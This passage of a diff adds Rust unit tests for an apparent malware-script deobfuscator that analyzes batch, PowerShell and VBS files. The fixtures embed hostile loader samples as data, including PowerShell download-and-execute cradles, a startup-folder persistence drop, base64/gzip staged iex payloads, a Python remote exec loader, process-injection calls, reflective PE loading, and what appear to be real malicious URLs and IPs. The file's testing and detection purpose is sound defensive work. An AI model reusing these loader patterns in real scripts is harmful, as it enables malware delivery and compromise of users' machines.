+            "raw numeric labels leaked into output:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.matches("goto 500").count() <= 1,
+            "raw numeric dispatch gotos leaked into output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn arithmetic_scaffolding_noise_is_summarized_before_capping() {
+        let mut script = String::from("@echo off\r\n");
+        for i in 0..130u32 {
+            script.push_str(&format!(
+                "set /a \"_v{i}=(({} + {}) - (0x{:x} ^ 0x{:x}))\"\r\n",
+                i + 20,
+                i + 7,
+                i + 0x30,
+                i + 0x10
+            ));
+        }
+        script.push_str("echo after\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                max_traits_per_kind: 100,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ControlFlowObfuscation {
+                        pattern,
+                        arithmetic_count,
+                        goto_count,
+                    } if pattern == "arithmetic-scaffolding"
+                        && *arithmetic_count == 130
+                        && *goto_count == 0
+                )
+            }),
+            "missing arithmetic scaffold summary: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::TraitsCapped { capped_kind, .. } if capped_kind == "Arithmetic"
+            )),
+            "arithmetic scaffold noise should not emit generic cap: {:?}",
+            report.traits
+        );
+        let arithmetic_count = report
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::Arithmetic { .. }))
+            .count();
+        assert!(
+            arithmetic_count <= 8,
+            "arithmetic scaffold representatives were not pruned: arithmetic={arithmetic_count}"
+        );
+    }
+
+    #[test]
+    fn unreferenced_set_arithmetic_scaffolding_is_summarized_in_output() {
+        let mut script = String::from("@echo off\r\n");
+        for i in 0..72u32 {
+            script.push_str(&format!(
+                "set /a \"_v{i}=(({} + {}) - (0x{:x} ^ 0x{:x}))\"\r\n",
+                i + 20,
+                i + 7,
+                i + 0x30,
+                i + 0x10
+            ));
+        }
+        script.push_str("set /a \"_keep=(1+2)\"\r\n");
+        script.push_str("echo %_keep%\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted 73 unreferenced set scaffolding lines"),
+            "unreferenced arithmetic scaffold was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("_v0="),
+            "raw unreferenced arithmetic scaffold leaked:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo 3"),
+            "rendered command result was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn repeated_download_iocs_are_deduped_even_when_command_context_differs() {
         let script = b"powershell -Command \"curl http://82.65.68.158/yl1.ps1\"\r\npowershell -Command \"iwr http://82.65.68.158/yl1.ps1\"\r\npowershell -Command \"(New-Object Net.WebClient).DownloadString('http://82.65.68.158/yl1.ps1')\"\r\n";
         let cfg = Config {
@@ -20714,6 +42941,105 @@ mod trait_dedup_tests {
         assert!(
             !capped,
             "duplicate downloads caused cap: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn destination_bearing_download_replaces_generic_same_url_download() {
+        let url = "https://github.com/roukistl/ud/raw/main/ud.bat";
+        let dst = "C:\\Users\\Public\\WindowSafety.bat";
+        let script = format!(
+            "start /min powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('{url}', '{dst}')\"\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+        let matching: Vec<_> = report
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::Download { src, .. } if src == url))
+            .collect();
+
+        assert_eq!(
+            matching.len(),
+            1,
+            "generic and structured downloads both survived: {:?}",
+            report.traits
+        );
+        assert!(
+            matches!(matching[0], Trait::Download { dst: Some(seen), .. } if seen == dst),
+            "destination-bearing download was not retained: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn public_profile_download_destinations_are_semantically_deduped() {
+        let url = "https://example.test/pogba.zip";
+        let mut traits = vec![
+            Trait::Download {
+                cmd: "ps1 a".to_string(),
+                src: url.to_string(),
+                dst: Some("%PUBLIC%\\\\Document.zip".to_string()),
+            },
+            Trait::Download {
+                cmd: "ps1 b".to_string(),
+                src: url.to_string(),
+                dst: Some("C:\\Users\\Public\\\\Document.zip".to_string()),
+            },
+        ];
+
+        super::dedup_traits(&mut traits, 100);
+        let downloads = traits
+            .iter()
+            .filter(|t| matches!(t, Trait::Download { src, .. } if src == url))
+            .count();
+        assert_eq!(
+            downloads, 1,
+            "PUBLIC and expanded public destinations were not deduped: {:?}",
+            traits
+        );
+    }
+
+    #[test]
+    fn repeated_extracted_powershell_downloadfile_traits_are_semantically_deduped() {
+        let script = b"@echo off\r\nstart /min powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/roukistl/ud/raw/main/ud.bat', '%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindowSafety.bat');[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/roukistl/dcm2/raw/main/Document.zip', 'C:\\Users\\Public\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 1; C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\Lib\\sim.py; del C:/Users/Public/Document.zip\"\r\n";
+
+        let report = analyze(script, &Config::default());
+        let ud_downloads: Vec<_> = report
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/roukistl/ud/raw/main/ud.bat"
+                )
+            })
+            .collect();
+
+        assert_eq!(
+            ud_downloads.len(),
+            1,
+            "repeated extracted PS1 downloads were not deduped: {:?}",
+            report.traits
+        );
+
+        let document_downloads: Vec<_> = report
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/roukistl/dcm2/raw/main/Document.zip"
+                )
+            })
+            .collect();
+        assert_eq!(
+            document_downloads.len(),
+            1,
+            "repeated extracted PS1 archive downloads were not deduped: {:?}",
             report.traits
         );
     }
@@ -21836,6 +44162,28 @@ $clnt.DownloadFile($url,$file)
     }
 
     #[test]
+    fn webclient_downloadfile_separator_glued_url_argument_emits_one_download() {
+        let ps = r#"$wc = New-Object Net.WebClient; $wc.DownloadFile('https://downloadfile-first.example/a>http://downloadfile-second.example/b>https://downloadfile-third.example/c ', 'C:\Users\Public\tool.exe')"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let downloads: Vec<_> = report
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, .. } if src.contains("downloadfile-") => Some(src.as_str()),
+                _ => None,
+            })
+            .collect();
+
+        assert_eq!(
+            downloads,
+            vec!["https://downloadfile-first.example/a"],
+            "separator-glued URLs inside one DownloadFile argument should not be promoted as separate downloads: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn webclient_downloadfile_schemeless_domain_path_url_extracted() {
         let ps = r#"$wc=New-Object Net.WebClient;$wc.DownloadFile("cdn-webclient.com/stage.exe","C:\Users\Public\stage.exe")"#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
@@ -22704,6 +45052,48 @@ Invoke-Expression $cmd"#,
                 )
             }),
             "literal ToCharArray index extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_substring_extractor_skips_function_noise_before_definition() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-function-noise.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let mut inner = String::new();
+        for _ in 0..700 {
+            inner.push_str(
+                "# function {} this is comment noise that should not count as a definition\n",
+            );
+        }
+        inner.push_str(&format!(
+            r#"function Pick($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Pick '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        ));
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-function-noise.example/stage.ps1"
+                )
+            }),
+            "literal substring extractor after function noise was not decoded: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
@@ -25056,6 +47446,43 @@ iex $stage
     }
 
     #[test]
+    fn ps1_normalization_decodes_variable_gzip_function_base64_spaced_call() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded = "Invoke-WebRequest -Uri https://gzip-func-spaced-call.example/stage.ps1";
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let gz = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
+        let ps = format!(
+            r#"
+$blob = "{b64}"
+function InflateBytes ([byte[]]$bytes) {{
+    $inputStream = [IO.MemoryStream]::new($bytes)
+    $gzipStream = [IO.Compression.GZipStream]::new($inputStream, [IO.Compression.CompressionMode]::Decompress)
+    $outputStream = [IO.MemoryStream]::new()
+    $gzipStream.CopyTo($outputStream)
+    $outputStream.ToArray()
+}}
+$stage = [Text.Encoding]::UTF8.GetString((InflateBytes ([Convert]::FromBase64String($blob)))).TrimEnd("`0")
+iex $stage
+"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://gzip-func-spaced-call.example/stage.ps1"),
+            "spaced gzip function payload not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "gzip function base64 call should be replaced by decoded script:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_variable_deflate_function_base64() {
         use base64::Engine;
         use std::io::Write;
@@ -25655,10 +48082,10 @@ powershell -NoP -C "try {{ $Natural = (Get-Content '%~f0') -join [Environment]::
     #[test]
     fn ps1_self_read_marker_base64_carrier_line_is_summarized_without_losing_payload() {
         use base64::Engine;
-        let marker = "remoK3Z8Q5FIG2qXL6SsHa7";
+        let marker = "::remoK3Z8Q5FIG2qXL6SsHa7";
         let payload = format!(
-            "$u='https://selfread-marker-long.example/FLEE.ps1'; Invoke-WebRequest -Uri $u;#{}",
-            "A".repeat(8_192)
+            "Start-Sleep -Seconds 9; [Kernel32]::WriteProcessMemory($proc, $addr, $payload, $payload.Length, [IntPtr]::Zero); $u='https://selfread-marker-long.example/FLEE.ps1'; Invoke-WebRequest -Uri $u;#{}",
+            "A".repeat(300 * 1024)
         );
         let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
         let script = format!(
@@ -25669,13 +48096,19 @@ exit /b
 "#
         );
         let report = analyze(script.as_bytes(), &Config::default());
+        assert_eq!(
+            crate::self_read_base64_marker_prefixes(&script),
+            vec![marker.to_string()],
+            "brace marker regex was not recognized"
+        );
         assert!(
+            report.extracted_ps1.iter().all(|ps| ps.len() < 300 * 1024),
+            "large marker payload should not be emitted whole: {:?}",
             report
-                .extracted_ps1_normalized
+                .extracted_ps1
                 .iter()
-                .any(|ps| ps.contains("https://selfread-marker-long.example/FLEE.ps1")),
-            "marker self-read payload was not normalized:\n{:?}",
-            report.extracted_ps1_normalized
+                .map(Vec::len)
+                .collect::<Vec<_>>()
         );
         assert!(
             report.traits.iter().any(|t| {
@@ -25686,9 +48119,66 @@ exit /b
             report.traits
         );
         assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::ProcessInjection { api } if api == "WriteProcessMemory")
+            }) && report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::BeaconSleep { seconds } if *seconds == 9)),
+            "large marker payload was not fast-scanned: {:?}",
+            report.traits
+        );
+        assert!(
             report
                 .deobfuscated
-                .contains("harrington: omitted self-read base64 marker payload"),
+                .contains("rem omitted self-read base64 marker payload"),
+            "marker carrier line was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "marker carrier base64 remained in deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn ps1_self_read_marker_base64_char_class_with_braces_is_summarized() {
+        use base64::Engine;
+        let marker = "REMKUOoWEBF7tKUHjAv";
+        let payload = format!(
+            "$u='https://selfread-marker-braces.example/FLEE.ps1'; Invoke-WebRequest -Uri $u;#{}",
+            "A".repeat(8_192)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            r#"@echo off
+set PSPATH=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+%PSPATH% -nop -w 1 -ep bypass -c "$d=[IO.File]::ReadAllText('%~f0');if($d-match'{marker}([A-Za-z0-9+/={{}}]+)'){{[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1]))}}" | %PSPATH% -nop -w 1 -ep bypass -
+exit /b
+{marker}{b64}
+"#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://selfread-marker-braces.example/FLEE.ps1")),
+            "marker self-read payload was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. }
+                    if src.contains("selfread-marker-braces.example/FLEE.ps1"))
+            }),
+            "marker self-read payload URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted self-read base64 marker payload"),
             "marker carrier line was not summarized:\n{}",
             report.deobfuscated
         );
@@ -25778,13 +48268,306 @@ exit
         assert!(
             report
                 .deobfuscated
-                .contains("harrington: omitted self-tail base64 payload"),
+                .contains("rem omitted tail base64 PowerShell payload")
+                || report
+                    .deobfuscated
+                    .contains("rem omitted self-tail base64 payload"),
             "capped tail payload was not summarized:\n{}",
             report.deobfuscated
         );
         assert!(
             !report.deobfuscated.contains("…[truncated]"),
             "capped duplicate tail payload remained in deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn tail_base64_powershell_payload_is_summarized_before_interpretation() {
+        use base64::Engine;
+        let payload = format!(
+            "$u='https://tail-b64-ps.example/stage.ps1'; Invoke-WebRequest -Uri $u;#{}",
+            "A".repeat(128_000)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            "@echo off\r\nset noisy=exit\r\ncall powershell -Command \"iex decoded-tail\"\r\n{b64}\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted tail base64 PowerShell payload"),
+            "tail base64 PS payload was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..1024]),
+            "tail carrier leaked into deobfuscated output"
+        );
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("tail-b64-ps.example/stage.ps1")),
+            "decoded tail PS was not retained in extracted payloads: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://tail-b64-ps.example/stage.ps1")
+            }),
+            "decoded tail URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn tail_base64_python_payload_is_recovered_as_script_not_ps1() {
+        use base64::Engine;
+
+        let payload = format!(
+            "import requests, zlib\n\
+             junk = '{}'\n\
+             exec(requests.get('https://tail-b64-python.example/stage.py').text)\n\
+             exec(__import__('marshal').loads(zlib.decompress(__import__('base64').b85decode(junk))))\n",
+            "$".repeat(8_000)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!("@echo off\r\npowershell -NoP -C \"iex tail-loader\"\r\n{b64}\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted tail base64 Python script payload"),
+            "tail base64 payload was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.extracted_ps1.iter().any(|payload| {
+                String::from_utf8_lossy(payload).contains("tail-b64-python.example/stage.py")
+            }),
+            "Python tail payload should not be reported as extracted PowerShell: {:?}",
+            report.extracted_ps1
+        );
+        assert!(
+            report.recovered_pe.iter().any(|(label, bytes)| {
+                label.starts_with("tail-base64-python")
+                    && String::from_utf8_lossy(bytes).contains("tail-b64-python.example/stage.py")
+            }),
+            "Python tail payload was not recovered as a script artifact: {:?}",
+            report.recovered_pe
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://tail-b64-python.example/stage.py")
+            }),
+            "decoded Python URL was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn percent_noise_does_not_mask_tail_base64_powershell_summary() {
+        use base64::Engine;
+        let payload = format!(
+            "$u='https://tail-b64-percent.example/stage.ps1'; Invoke-WebRequest -Uri $u;#{}",
+            "A".repeat(64_000)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let percent_noise = "%AbCdEfGh:~1,1%".repeat(260);
+        let script = format!("@echo off\r\nset AbCdEfGh=powersh\r\n{percent_noise}\r\n{b64}\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted tail base64 PowerShell payload"),
+            "tail base64 summary missing:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..1024]),
+            "tail carrier leaked when percent-noise summary was also present"
+        );
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("tail-b64-percent.example/stage.ps1")),
+            "decoded tail PS was not retained: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
+    fn tail_base64_gzip_wrapper_is_peeled_before_ps_scan() {
+        use base64::Engine;
+        use std::io::Write as _;
+
+        let mut filler = String::with_capacity(128_000);
+        let mut state = 0x1234_5678u32;
+        for _ in 0..128_000 {
+            state = state.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
+            filler.push(char::from(b'A' + ((state >> 24) % 26) as u8));
+        }
+        let final_ps = format!(
+            "$u='https://tail-gzip-wrapper.example/stage.ps1'; Invoke-WebRequest -Uri $u;#{}",
+            filler
+        );
+        let final_b64 = base64::engine::general_purpose::STANDARD.encode(final_ps.as_bytes());
+        let inner = format!(
+            "$stage='{final_b64}';iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($stage)))"
+        );
+        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        gz.write_all(inner.as_bytes()).expect("write gzip");
+        let gz_b64 =
+            base64::engine::general_purpose::STANDARD.encode(gz.finish().expect("finish gzip"));
+        let wrapper = format!(
+            "$blob=\"{gz_b64}\";function Inflate($x){{$m=New-Object IO.MemoryStream(,$x);$g=New-Object IO.Compression.GZipStream($m,[IO.Compression.CompressionMode]::Decompress);$o=New-Object IO.MemoryStream;$g.CopyTo($o);$o.ToArray()}};$s=[Text.Encoding]::UTF8.GetString((Inflate([Convert]::FromBase64String($blob))));iex $s"
+        );
+        let tail = base64::engine::general_purpose::STANDARD.encode(wrapper.as_bytes());
+        let script = format!("@echo off\r\nset noisy=exit\r\n{tail}\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted tail base64 PowerShell payload"),
+            "tail wrapper was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://tail-gzip-wrapper.example/stage.ps1")),
+            "peeled tail gzip wrapper was not scanned: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::TimeoutHit { .. })),
+            "peeled tail gzip wrapper should not hit timeout: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn tail_base64_gzip_wrapper_large_add_type_stage_uses_fast_scan() {
+        use base64::Engine;
+        use std::io::Write as _;
+
+        let mut encoded_blob = String::with_capacity(170_000);
+        let mut state = 0x811c_9dc5u32;
+        for _ in 0..170_000 {
+            state ^= state << 13;
+            state ^= state >> 17;
+            state ^= state << 5;
+            let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+            encoded_blob.push(alphabet[(state as usize) & 63] as char);
+        }
+        let final_ps = format!(
+            "$blob = \"{encoded_blob}\"\r\n\
+             $code = @\"\r\n\
+             using System;\r\n\
+             using System.Diagnostics;\r\n\
+             public class Stage {{ public static void Run() {{ Process.GetProcessesByName(\"ping\"); }} }}\r\n\
+             \"@\r\n\
+             Add-Type -TypeDefinition $code\r\n\
+             [Stage]::Run()\r\n"
+        );
+        assert!(final_ps.len() > 150_000);
+
+        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        gz.write_all(final_ps.as_bytes()).expect("write gzip");
+        let gz_b64 =
+            base64::engine::general_purpose::STANDARD.encode(gz.finish().expect("finish gzip"));
+        let wrapper = format!(
+            "$blob=\"{gz_b64}\";function Inflate($x){{$m=New-Object IO.MemoryStream(,$x);$g=New-Object IO.Compression.GZipStream($m,[IO.Compression.CompressionMode]::Decompress);$o=New-Object IO.MemoryStream;$g.CopyTo($o);$o.ToArray()}};$s=[Text.Encoding]::UTF8.GetString((Inflate([Convert]::FromBase64String($blob))));iex $s"
+        );
+        let tail = base64::engine::general_purpose::STANDARD.encode(wrapper.as_bytes());
+        let script = format!("@echo off\r\nset noisy=exit\r\n{tail}\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 3,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted tail base64 PowerShell payload"),
+            "tail wrapper was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::TimeoutHit { .. })),
+            "large peeled tail gzip stage should use bounded scanning: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn aes_chain_hint_detects_concatenated_aes_fragments() {
+        let ps = "$gnaLNp = $vXSkLm + '.Se' + 'cur' + 'ity.Cry' + 'pt' + 'ogr' + 'aphy';;\
+                  $sfAcR = 'Fr' + 'omB' + 'ase' + '64S' + 'tri' + 'ng';;\
+                  $ybTKj = 'Tr' + 'ans' + 'for' + 'mFi' + 'nal' + 'Blo' + 'ck';;\
+                  $ojaarU=New-Object ($gnaLNp + '.Ae' + 'sMa' + 'nag' + 'ed');;\
+                  $ojaarU.Key=[Convert]::$sfAcR('AAAA');;\
+                  $ojaarU.IV=[Convert]::$sfAcR('AAAA');;\
+                  $gUYms=$ojaarU.CreateDecryptor();;\
+                  $gUYms.$ybTKj($bytes, 0, $bytes.Length)";
+
+        assert!(
+            super::text_has_aes_chain_hint(ps),
+            "concatenated AES stage was not recognized as AES-chain candidate"
+        );
+    }
+
+    #[test]
+    fn huge_raw_embedded_powershell_scan_is_skipped_when_deob_has_clear_powershell() {
+        let raw = "x".repeat(super::RAW_EMBEDDED_POWERSHELL_SCAN_MAX_BYTES + 1);
+        assert!(
+            !super::should_scan_raw_embedded_powershell(
+                &raw,
+                "powershell -NoProfile -Command Write-Host ok"
+            ),
+            "huge raw scan should be skipped when compact deob has a clear PowerShell invocation"
+        );
+    }
+
+    #[test]
+    fn huge_raw_embedded_powershell_scan_skips_noise_when_deob_lacks_powershell() {
+        let raw = "x".repeat(super::RAW_EMBEDDED_POWERSHELL_SCAN_MAX_BYTES + 1);
+        assert!(
+            !super::should_scan_raw_embedded_powershell(&raw, "cmd /c echo ok"),
+            "huge raw scan should skip raw text with no PowerShell indicators"
+        );
+    }
+
+    #[test]
+    fn huge_raw_embedded_powershell_scan_runs_when_raw_has_powershell() {
+        let raw = format!(
+            "{} powershell -NoProfile -Command Invoke-WebRequest https://raw-ps.example/p",
+            "x".repeat(super::RAW_EMBEDDED_POWERSHELL_SCAN_MAX_BYTES + 1)
+        );
+        assert!(
+            super::should_scan_raw_embedded_powershell(&raw, "cmd /c echo ok"),
+            "huge raw scan should run when raw text has a PowerShell indicator"
         );
     }
 
@@ -25824,6 +48607,56 @@ exit
                 .any(|t| { matches!(t, Trait::DownloadInDeobText { src, .. } if src == url) }),
             "recovered PE URL was not extracted: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_get_content_last_line_reversed_gzip_pe_is_recovered_and_summarized() {
+        use base64::Engine;
+        use std::io::Write as _;
+
+        let url = "https://selftail-getcontent.example/payload";
+        let mut pe = vec![0u8; 0x200];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.extend_from_slice(url.as_bytes());
+        let mut reversed = pe.clone();
+        reversed.reverse();
+        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        gz.write_all(&reversed).unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz.finish().unwrap());
+        let ps = r#"$x = get-content 'C:\sample.bat' | Select-Object -Last 1;$b=[Convert]::FromBase64String($x);$m=New-Object System.IO.MemoryStream(,$b);$o=New-Object System.IO.MemoryStream;$g=New-Object System.IO.Compression.GzipStream $m,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);[byte[]]$p=$o.ToArray();[Array]::Reverse($p);[System.Reflection.Assembly]::Load($p)"#;
+        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
+        let encoded_ps = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let script = format!("powershell -enc {encoded_ps}\r\nexit\r\n{b64}\r\n");
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.recovered_pe.iter().any(|(label, bytes)| label
+                .starts_with("ps1-self-tail-reversed-gzip-pe")
+                && bytes.starts_with(b"MZ")),
+            "get-content last-line reversed gzip PE was not recovered: {:?}",
+            report.recovered_pe
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::DownloadInDeobText { src, .. } if src == url) }),
+            "recovered PE URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted self-tail reversed gzip PE payload"),
+            "tail carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "tail carrier remained in deobfuscated output"
         );
     }
 
@@ -27078,6 +49911,37 @@ URLDownloadToFileW 0, u, "wide.exe", 0, 0"#;
         assert!(
             has,
             "no Download trait from VBS variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_hex_xor_crypt_wrapper() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"
+AAJCNbHGGP = "3363"
+sGLezCkWxkNXKIcJub = "5B474243091C19020A011801000518020607180009000503021C50465F5F06011E1E697D766418495A43"
+Set AOpppppp = CreateObject(oyncuPtvzvWEPBZnL("645A587B4747461D645A587B4747466156424356404718061D02"))
+AOpppppp.Open "GET", oyncuPtvzvWEPBZnL(sGLezCkWxkNXKIcJub), False
+AOpppppp.Send
+Private Function Crypt(Inp, Key, Mode)
+End Function
+function oyncuPtvzvWEPBZnL(StrToDecrypt)
+oyncuPtvzvWEPBZnL = Crypt(StrToDecrypt, AAJCNbHGGP, False)
+End Function
+"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://192.236.154.3:3301/full02--_NEW.zip"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS hex-XOR Crypt wrapper URL: {:?}",
             env.traits
         );
     }
@@ -29102,6 +51966,42 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn copy_b_multi_source_concat_respects_output_cap() {
+        let mut env = Environment::new(&Config {
+            max_output_bytes: 8,
+            ..Config::default()
+        });
+        for name in ["a.bin", "b.bin", "c.bin"] {
+            env.modified_filesystem.insert(
+                name.to_string(),
+                FsEntry::Content {
+                    content: b"ABCD".to_vec(),
+                    append: false,
+                },
+            );
+        }
+
+        interpret_line("copy /b a.bin + b.bin + c.bin out.exe", &mut env);
+
+        let entry = env
+            .modified_filesystem
+            .get("out.exe")
+            .expect("out.exe missing");
+        assert!(
+            matches!(entry, FsEntry::Content { content, .. } if content.len() == 8),
+            "copy /b output was not capped: {:?}",
+            entry
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::OutputCapped { .. })),
+            "expected OutputCapped trait: {:?}",
+            env.traits
